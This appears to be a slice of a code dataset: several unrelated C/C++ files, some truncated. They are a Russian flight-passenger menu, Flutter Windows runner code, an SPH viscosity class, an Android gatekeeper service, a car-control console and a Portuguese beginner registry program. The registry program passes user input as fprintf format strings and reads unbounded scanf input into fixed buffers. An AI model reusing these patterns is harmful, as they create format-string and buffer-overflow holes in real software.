\u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430\n    ofstream log(\"log.txt\");\n    while (1)\n    {  \n        cout << \"\u0414\u043b\u044f \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0435\u043d\u0438\u044f \u043d\u0430\u0436\u043c\u0438\u0442\u0435 \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0443\u0436\u043d\u043e\u0433\u043e \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f:\\n\u041e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 - (1)\\n\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u0430 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a - (2)\\n\";\n        cout << \"\u042d\u043a\u0441\u043f\u043e\u0440\u0442 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b (\\\"database.txt\\\") - (3)\\n\u0418\u043c\u043f\u043e\u0440\u0442 \u043f\u0430c\u0441\u0438\u0436\u0440\u043e\u0432 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 (\\\"database.txt\\\") - (4)\\n\u0421\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u043f\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438 - (5)\\n\";\n        cout << \"\u0412\u044b\u0432\u043e\u0434 \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0438\u0439 \u043a \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c\u0443 \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0432\u044b\u043b\u0435\u0442 - (6)\\n\u0412\u044b\u0432\u043e\u0434 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0440\u0435\u0439\u0441\u0430 - (7)\\n\u0421\u043f\u0438\u0441\u043e\u043a \u0440\u0435\u0439\u0441\u043e\u0432 \u0438\u0437 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0430\u044d\u0440\u043e\u043f\u043e\u0440\u0442\u0430 - (8)\\n\";\n        log << \"\u0414\u043b\u044f \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0435\u043d\u0438\u044f \u043d\u0430\u0436\u043c\u0438\u0442\u0435 \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0443\u0436\u043d\u043e\u0433\u043e \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f:\\n\u041e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 - (1)\\n\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u0430 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a - (2)\\n\";\n        log << \"\u042d\u043a\u0441\u043f\u043e\u0440\u0442 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b (\\\"database.txt\\\") - (3)\\n\u0418\u043c\u043f\u043e\u0440\u0442 \u043f\u0430c\u0441\u0438\u0436\u0440\u043e\u0432 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 (\\\"database.txt\\\") - (4)\\n\u0421\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u043f\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438 - (5)\\n\";\n        log << \"\u0412\u044b\u0432\u043e\u0434 \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0438\u0439 \u043a \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c\u0443 \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0432\u044b\u043b\u0435\u0442 - (6)\\n\u0412\u044b\u0432\u043e\u0434 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0440\u0435\u0439\u0441\u0430 - (7)\\n\u0421\u043f\u0438\u0441\u043e\u043a \u0440\u0435\u0439\u0441\u043e\u0432 \u0438\u0437 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0430\u044d\u0440\u043e\u043f\u043e\u0440\u0442\u0430 - (8)\\n\";\n        char ch = _getwch();\n        switch (ch)\n        {\n        case 27: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 Esc\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 Esc\\n\" << endl;\n        {\n            log.close();\n            exit(0);\n        }\n        case 13: cout << \"\\n\u043d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 Enter\\n\" << endl; log << \"\\n\u043d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 Enter\\n\" << endl; break;\n        case 56: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 8\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 8\\n\" << endl;\n        {\n            flight_airport(bilet, count, log);\n            break;\n        }\n        case 55: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 7\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 7\\n\" << endl;\n        {\n            print_passenger_flight(bilet, count, log);\n            break;\n        }\n        case 54: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 6\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 6\\n\" << endl;\n        {\n            bilet_near(bilet, count, log);\n            break;\n        }\n        case 53: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 5\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 5\\n\" << endl;\n        {\n            bilet = sorting(bilet, count);\n            break;\n        }\n        case 52: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 4\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 4\\n\" << endl;\n        {\n            bilet = import_from_file(bilet, count, \"database.txt\", log);\n            break;\n        }\n        case 51: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 3\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 3\\n\" << endl;\n        {\n            export_to_file(bilet, count, \"database.txt\", log);\n            break;\n        }\n        case 50: cout << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 2\\n\" << endl; log << \"\\n\u041d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 2\\n\" << endl;\n        {\n            bilet = user_input(bilet, count, log);\n            //cout << bilet[0].name << endl;\n            //cout << bilet[1].name << endl;\n\n            b",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"JSphVisco.h\"\r\n#include \"Functions.h\"\r\n#include \"JReadDatafile.h\"\r\n#include <cstring>\r\n#include <float.h>\r\n\r\nusing namespace std;\r\n\r\n/// Constructor:\r\nJSphVisco::JSphVisco(){\r\n\tClassName=\"JSphVisco\";\r\n\tTimes=NULL;\r\n\tValues=NULL;\r\n\tReset();\r\n}\r\n\r\n// Destructor:\r\nJSphVisco::~JSphVisco(){\r\n\tReset();\r\n}\r\n\r\n// Initialisation of variables:\r\nvoid JSphVisco::Reset(){\r\n\tdelete[] Times;\r\n\tTimes=NULL;\r\n\tdelete[] Values;\r\n\tValues=NULL;\r\n\tFile=\"\";\r\n\tSize=Count=Position=0;\r\n}\r\n\r\n// Resizes allocated space for values:\r\nvoid JSphVisco::Resize(unsigned size){\r\n\tTimes=fun::ResizeAlloc(Times,Count,size);\r\n\tValues=fun::ResizeAlloc(Values,Count,size);\r\n\tSize=size;\r\n}\r\n\r\n// Returns the allocated memory:\r\nunsigned JSphVisco::GetAllocMemory()const{\r\n\tunsigned s=0;\r\n\tif(Times)\r\n\t\ts+=sizeof(float)*Size;\r\n\tif(Values)\r\n\t\ts+=sizeof(float)*Size;\r\n\treturn(s);\r\n}\r\n\r\n// Loads viscosity values for different instants (in secods):\r\nvoid JSphVisco::LoadFile(std::string file){\r\n\tconst char met[]=\"LoadFile\";\r\n\tReset();\r\n\tJReadDatafile rdat;\r\n\trdat.LoadFile(file,FILESIZEMAX);\r\n\tconst unsigned rows=rdat.Lines()-rdat.RemLines();\r\n\tResize(rows);\r\n\tfor(unsigned r=0;r<rows;r++){\r\n\t\tTimes[r]=rdat.ReadNextFloat(false);\r\n\t\tValues[r]=rdat.ReadNextFloat(true);\r\n\t\t//printf(\"FileData[%u]>  t:%f  ang:%f\\n\",r,Times[r],Values[r]);\r\n\t}\r\n\tCount=rows;\r\n\tif(Count<2)\r\n\t\tRunException(met,\"Cannot be less than two values.\",file);\r\n\tFile=file;\r\n}\r\n\r\n// Returns the viscosity value for the indicated instant:\r\nfloat JSphVisco::GetVisco(float timestep){\r\n\tfloat ret=0.f;\r\n\t//-Searches indicated interval of time.\r\n\tfloat tini=Times[Position];\r\n\tfloat tnext=(Position+1<Count? Times[Position+1]: tini);\r\n\tfor(;tnext<timestep&&Position+2<Count;Position++){\r\n\t\ttini=tnext;\r\n\t\ttnext=Times[Position+2];\r\n\t}\r\n\t//-Computes dt for the indicated instant.\r\n\tif(timestep<=tini)\r\n\t\tret=Values[Position];\r\n\telse if(timestep>=tnext)\r\n\t\tret=Values[Position+1];\r\n\telse{\r\n\t\tconst double tfactor=double(timestep-tini)/double(tnext-tini);\r\n\t\tfloat vini=Values[Position];\r\n\t\tfloat vnext=Values[Position+1];\r\n\t\tret=float(tfactor*(vnext-vini)+vini);\r\n\t}\r\n\treturn(ret);\r\n}\r\n\r\n\r\n\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#define LOG_TAG \"android.hardware.gatekeeper@1.0-service.optee\"\n\n#include <android-base/logging.h>\n#include <android/hardware/gatekeeper/1.0/IGatekeeper.h>\n\n#include <hidl/LegacySupport.h>\n\n#include \"RkGateKeeperDevice.h\"\n\n// Generated HIDL files\nusing android::RkGateKeeperDevice;\nusing android::hardware::gatekeeper::V1_0::IGatekeeper;\n\nint main() {\n    ::android::hardware::configureRpcThreadpool(1, true /* willJoinThreadpool */);\n    android::sp<RkGateKeeperDevice> gatekeeper(new RkGateKeeperDevice());\n    auto status = gatekeeper->registerAsService();\n    if (status != android::OK) {\n        LOG(FATAL) << \"Could not register service for Gatekeeper 1.0 (optee) (\" << status << \")\";\n    }\n\n    android::hardware::joinRpcThreadpool();\n    return -1;  // Should never get here.\n}\n",
    "\r\n#include <stdio.h> //biblioteca de comunica\u00e7\u00e3o com o usu\u00e1rio\r\n#include <stdlib.h> //biblioteca de aloca\u00e7\u00f5es de espa\u00e7o em mem\u00f3ria\r\n#include <locale.h> //biblioteca de aloca\u00e7\u00f5es de texto por regi\u00e3o\r\n#include <string.h> //biblioteca responsavel por cuidar das string\r\n\t\t\r\nint registro() //fun\u00e7\u00e3o responsavel por cadastras os usu\u00e1rios no sistema\r\n{\r\n\t//inicio cria\u00e7\u00e3o de vari\u00e1veis/string\r\n\tchar arquivo[40];\r\n\tchar cpf[40];\r\n\tchar nome[40];\r\n\tchar sobrenome[40];\r\n\tchar cargo[40];\r\n\t//final da cria\u00e7\u00e3o de vari\u00e1veis/string\r\n\t\r\n\tprintf(\"Digite o CPF a ser cadastrado: \"); //coletando informa\u00e7\u00e3o do usu\u00e1rio\r\n\tscanf(\"%s\", cpf); //%s refere-se a string\r\n\t\r\n\tstrcpy(arquivo, cpf); //Responsavel por copiar os valores das string\r\n\t\r\n\tFILE *file; // cria o arquivo\r\n\tfile = fopen(arquivo, \"w\"); // ria o arquivo e o \"w\" significa escrever\r\n\tfprintf(file,cpf); // salvo o valor da variavel\r\n\tfclose(file); // fecha o arquivo\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); //fopen comando para abrir o arquivo\r\n\tfprintf(file,\",\"); //gravar informa\u00e7\u00f5es do arquivo aberto\r\n\tfclose(file);//fechar um arquivo aberto\r\n\t\r\n\tprintf(\"Digite o nome a ser cadastrado: \");\r\n\tscanf(\"%s\",nome);\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); //fopen comando para abrir o arquivo\r\n\tfprintf(file,nome);//gravar informa\u00e7\u00f5es do arquivo\r\n\tfclose(file);//fechar o arquivo\r\n\t\r\n\tfile = fopen(arquivo, \"a\");// fopen comando para abrir o arquivo\r\n\tfprintf(file,\",\");//gravar informa\u00e7\u00f5es do arquivo aberto\r\n\tfclose(file); //fechar um arquivo aberto\r\n\t\r\n\tprintf(\"Digite o sobrenome a ser cadastrado: \");\r\n\tscanf(\"%s\",sobrenome); //%s salvar dentro da string\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); // fopen comando para abrir o arquivo\r\n\tfprintf(file,sobrenome); //gravar informa\u00e7\u00f5es do arquivo\r\n\tfclose(file); //fechar um arquivo aberto\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); // fopen comando para abrir o arquivo\r\n\tfprintf(file,\",\"); //gravar informa\u00e7\u00f5es do arquivo\r\n\tfclose(file); //fechar um arquivo aberto\r\n\t\r\n\tprintf(\"Digite o cargo a ser cadastrado: \"); \r\n\tscanf(\"%s\",cargo); //%s salvar dentro da string\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); // fopen comando para abrir o arquivo\r\n\tfprintf(file,cargo); //gravar informa\u00e7\u00f5es do arquivo\r\n\tfclose(file);\t//fechar um arquivo aberto\r\n\t\r\n    system(\"pause\"); //comando para pausar a tela e dar tempo para o usu\u00e1rio ler\r\n\r\n}\r\n\r\nint consulta()\r\n{\r\n\t\tsetlocale(LC_ALL, \"Portuguese\"); //Definindo a linguagem\r\n\tchar cpf[40];\r\n\tchar conteudo[200];\r\n\t\r\n\tprintf(\"Digite o cpf a ser consultado\");\r\n\tscanf(\"%s\",cpf);\r\n\t\r\n\tFILE *file;\r\n\tfile= fopen(cpf,\"r\");\r\n\t\r\n\tif(file==NULL)\r\n\t\r\n\t{\r\n\t\r\n\t\t\tprintf(\"N\u00e3o foi possivel abrir o arquivo, n\u00e3o localizado!.\\n \");\t\r\n\t}\r\n\twhile(fgets(conteudo,200, file) !=NULL)\r\n\t{\r\n\t\tprintf(\"\\nEssas s\u00e3o as informa\u00e7\u00f5es do usu\u00e1rio: \");\r\n\t    printf(\"%s\", conteudo);\r\n\t\tprintf(\"\\n\\n\");\r\n\t\t\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\n\r\nint deletar()\r\n{\r\n\t\r\n\tchar cpf[40];\r\n\t\r\n\tprintf(\"Digite o cpf do usu\u00e1rio a ser deletado: \");\r\n\tscanf(\"%/s\",cpf);\r\n\t\r\n\tremove(cpf);\r\n    \r\n\tFILE *file;\r\n\tfile=fopen(cpf,\"r\");\r\n\t\r\n\tif(file==NULL)\r\n\t{\r\n\t\tprintf(\"o usu\u00e1rio n\u00e3o se encontra no sistema!\\n\");\r\n\t\tsystem(\"pause\");\r\n\t}\r\n\t\r\n}\r\n\r\n\r\n\t\r\nint main()\r\n\r\n\t{\r\n\tint opcao=0; //Definindo vari\u00c3\u00a1veis\r\n\tint laco=1;\r\n\t\r\n\tfor(laco=1;laco=1;)\r\n\t{\r\n\r\n\t\tsystem(\"cls\");\r\n\r\n\t\tsetlocale(LC_ALL, \"Portuguese\"); //Definindo a linguagem\r\n\t\t\t\r\n\t\tprintf(\"### Cart\u00f3rio da EBAC ###\\n\\n\"); //inicio do menu\r\n\t\tprintf(\"Escolha a op\u00e7\u00e3o desejada do menu\\n\\n\");\r\n\t\tprintf(\"\\t1 - Registrar nomes\\n\");\r\n\t\tprintf(\"\\t2 - Consultar nomes\\n\");\r\n\t\tprintf(\"\\t3 - Deletar nomes\\n\\n\"); \r\n\t\tprintf(\"\\t4 - Sair do sistema\\n\\n\");\r\n\t\tprintf(\"Op\u00e7\u00e3o: \");//fim do menu\r\n\t\t\t\t\r\n\tscanf(\"%d\", &opcao); //armazenando a escolha do usu\u00e1rio\r\n\t\t\r\n\t\tsystem(\"cls\");//respons\u00e1vel por limpar a tela\r\n\t\r\n\t\tswitch(opcao) //inicio da sele\u00e7\u00e3o do menu\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\tregistro(); //chamada de fun\u00e7\u00f5es\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase 2:\r\n\t\t\tconsulta(); //chamada de fun\u00e7\u00f5es\r\n\t\t\tbreak;\r\n\t\t\r\n\t\t\tcase 3:\r\n\t\t\tdeletar(); //chamada de fun\u00e7\u00f5es\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase 4:\r\n\t\t\t\tprintf(\"Obrigado por utilizar o sistema!\\n\");\r\n\t\t\t\treturn 0;\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\tdefault:\r\n\t\t\tprintf(\"Essa op\u00e7\u00e3o n\u00e3o est\u00e1\u00a1 disponivel!\\n\");\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tbreak;\r\n\t\t} //fim da sele\u00e7\u00e3o\r\n\t\t\t\r\n\t}\t\r\n}\r\n",
    "#include <limits>\n#include <optional>\n#include \"Car.h\"\n\nenum class Command {\n    Info,\n    Help,\n    EngineOn,\n    EngineOff,\n    SetGear,\n    SetSpeed,\n    Default\n};\n////                                                                        done none command crash\n////                                                                        done change direction error\n\nCommand StrToCommand(const std::string& str) {\n    if (str == \"Info\") {\n        return Command::Info;\n    } else if (str == \"help\") {\n        return Command::Help;\n    } else if (str == \"EngineOn\") {\n        return Command::EngineOn;\n    } else if (str == \"EngineOff\") {\n        return Command::EngineOff;\n    } else if (str == \"SetGear\") {\n        return Command::SetGear;\n    } else if (str == \"SetSpeed\") {\n        return Command::SetSpeed;\n    } else {\n        return Command::Default;\n    }\n}\n\nvoid PrintInfo(const CCar& car)\n{\n    std::cout << \"Engine: \" << (car.IsTurnedOn() ? \"on\" : \"off\") << std::endl;\n    std::cout << \"Direction: \" << car.GetDirection() << std::endl;\n    std::cout << \"Speed: \" << car.GetSpeed() << std::endl;\n    std::cout << \"Gear: \" << car.GetGear() << std::endl;\n}\n\nvoid PrintListOfCommands()\n{\n    std::cout << \"Available commands:\" << std::endl;\n    std::cout << \"Info             - display current car state\" << std::endl;\n    std::cout << \"EngineOn         - turn on the engine\" << std::endl;\n    std::cout << \"EngineOff        - turn off the engine\" << std::endl;\n    std::cout << \"SetGear [gear]   - set the gear to the specified value (-1 to 5)\" << std::endl;\n    std::cout << \"SetSpeed [speed] - set the speed to the specified value\" << std::endl;\n}\n\nstd::optional<int> GetInteger()\n{\n    int num;\n    std::cin >> num;\n    if (std::cin.fail())\n    {\n        std::cout << \"Invalid input. Please enter integer number in function parameter.\" << std::endl;\n        std::cin.clear(); // clear the error flag on cin\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); // ignore any remaining input on the line\n        return std::nullopt;\n    }\n    return num;\n}\n\nvoid CommandSetGear(CCar& car, int gear)\n{\n    try {\n        car.SetGear(gear);\n        std::cout << \"Gear \" << gear << \" set successfully.\" << std::endl;\n    }catch (const EngineOffError& e) {\n        std::cerr << \"Error: Engine is off, cannot change gear.\" << std::endl;\n    } catch (const GearRangeError& e) {\n        std::cerr << \"Error: Gear is not in the range of -1 to 5.\" << std::endl;\n    } catch (const GearSpeedRangeError& e) {\n        std::cerr << \"Error: New gear cannot handle current speed.\" << std::endl;\n    } catch (const ReverseToForwardError& e) {\n        std::cerr << \"Error: Cannot change from reverse to forward while moving backwards.\" << std::endl;\n    } catch (const ReverseSpeedError& e) {\n        std::cerr << \"Error: Cannot switch to reverse gear while moving\" << std::endl;\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: Unknown error \" << std::endl;\n    }\n}\n\nvoid CommandSetSpeed(CCar& car, int speed)\n{\n    try {\n        car.SetSpeed(speed);\n        std::cout << \"Speed \" << speed << \" set successfully.\" << std::endl;\n    } catch (const EngineOffError& e) {\n        std::cerr << \"Error: Engine is off, cannot change speed\" << std::endl;\n    } catch (const IncreaseSpeedError& e) {\n        std::cerr << \"Error: Cannot increase speed while in neutral.\" << std::endl;\n    } catch (const MaxSpeedError& e) {\n        std::cerr << \"Error: Cannot exceed max speed for current gear.\" << std::endl;\n    } catch (const NegativeSpeedError& e) {\n        std::cerr << \"Error: Speed cannot be negative.\" << std::endl;\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: Unknown error \" << std::endl;\n    }\n}\n\nvoid HandleCommand(CCar& car, const std::string& command) {\n    switch (StrToCommand(command)) {\n        case Command::Info:\n            PrintInfo(car);\n            break;\n        case Command::Help:\n            PrintListOfCommands();\n            break;\n        case Command::EngineOn:\n            if (!car.TurnOnEngine())\n                std::cerr << \"Failed to turn on engine\" << std::endl;\n            else\n                std::cout << \"Engine turned on! Lets ride!\" << std::endl;\n            break;\n        case Command::EngineOff:\n            if (!car.TurnOffEngine())\n                std::cerr << \"Failed to turn off engine\" << std::endl;\n            else\n                std::cout << \"Successfully stopped the engine.\" << std::endl;\n            break;\n        case Command::SetGear: {\n            std::optional<int> gear = GetInteger();\n            if (gear.has_value()) CommandSetGear(car, gear.value());\n            break;\n        }\n        case Command::SetSpeed: {\n            std::optional<int> speed = GetInteger();\n            if (speed.has_value()) CommandSetSpeed(car, speed.value());\n            break;\n        }\n        case Command::Default: {\n            std::cout << \"Unknown 